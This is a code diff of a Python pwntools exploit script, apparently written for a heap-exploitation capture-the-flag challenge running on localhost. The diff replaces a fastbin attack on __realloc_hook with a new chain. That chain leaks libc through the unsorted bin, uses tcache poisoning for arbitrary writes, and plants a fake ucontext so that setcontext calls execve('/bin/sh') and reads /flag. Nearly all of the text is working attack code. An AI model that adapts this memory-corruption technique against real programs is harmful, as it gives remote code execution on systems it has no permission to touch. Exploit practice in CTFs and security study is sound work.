@@ -8,15 +8,17 @@ ld_name = './ld-linux-x86-64.so.2'
 context.terminal = ['tmux', 'splitw', '-h']
 
 HOST = '127.0.0.1'
-PORT = 6666
+PORT = 18120
 server = None
+OFFSET_MAIN_ARENA_60 = 0x1ecbe0
 
-#webpwn起始点
+
 def start():
     global server
     if args.LOCAL:
         server = process([ld_name, '--library-path', '.', elf.path])
         sleep(0.2)
+        return remote(HOST, 6666)
     return remote(HOST, PORT)
 
 
@@ -58,35 +60,54 @@ def show(index):
     ru(b'>')
     io.send(build(index, 0, b''))
 
+
+def poison(base, target):
+    add(base, 0x60, b'A')
+    add(base + 1, 0x60, b'B')
+    delete(base)
+    delete(base + 1)
+    edit(base + 1, 8, p64(target))
+    add(base + 2, 0x60, b'C')
+    add(base + 3, 0x60, b'D')
+    return base + 3
+
+
+def write_any(base, addr, data):
+    land = poison(base, addr)
+    edit(land, len(data), data)
+
+
 def pwn():
-    add(0, 0x90, b'A' * 0x10)
-    add(1, 0x10, b'B' * 0x10)
-    delete(0)
-    show(0)
+    for i in range(9):
+        add(i, 0x90, b'A')
+
+    for i in range(7):
+        delete(i)
+
+    delete(7)
+    show(7)
     ru(b'leaking...\n')
-    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x3c4b78
+    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - OFFSET_MAIN_ARENA_60
     log.success(f'libc base = {hex(libc.address)}')
 
-    realloc_hook = libc.sym['__realloc_hook']
-    malloc_hook = libc.sym['__malloc_hook']
-    realloc = libc.sym['realloc']
-    ogg = libc.address + 0x4527a
+    # Use the Heap bss area for /bin/sh, argv and x87 env.
+    write_any(20, 0x602940, b'/bin/sh\x00')
+    write_any(24, 0x602950, p64(0x602940) + p64(0))
+    write_any(28, 0x602960, b'\x00' * 0x28)
 
-    log.success(f'__realloc_hook = {hex(realloc_hook)}')
-    log.success(f'__malloc_hook = {hex(malloc_hook)}')
-    log.success(f'realloc = {hex(realloc)}')
-    log.success(f'one_gadget = {hex(ogg)}')
+    # After this edit returns, free(req) jumps into setcontext.
+    # req itself is the fake ucontext and returns into execve("/bin/sh", argv, 0).
+    payload = bytearray(0x1c0)
+    payload[0x28:0x30] = p64(libc.sym['setcontext'])
+    payload[0x58:0x60] = p64(0x602940)
+    payload[0x60:0x68] = p64(0x602950)
+    payload[0x90:0x98] = p64(0x6029d0)
+    payload[0x98:0xa0] = p64(libc.sym['execve'])
+    payload[0xd0:0xd8] = p64(0x602960)
+    payload[0x1b0:0x1b4] = p32(0x1f80)
+    write_any(32, 0x601800, bytes(payload))
 
-    add(2, 0x60, b'C')
-    delete(2)
-    edit(2, 8, p64(realloc_hook - 0x1b))
-    add(3, 0x60, b'D')
-    add(4, 0x60, b'E')
-
-    payload = b'A' * 0xb + p64(ogg) + p64(realloc + 0x10)
-    edit(4, len(payload), payload)
-    
-    cmd(1)
+    io.sendline(b'cat /flag')
 
 
 if __name__ == '__main__':
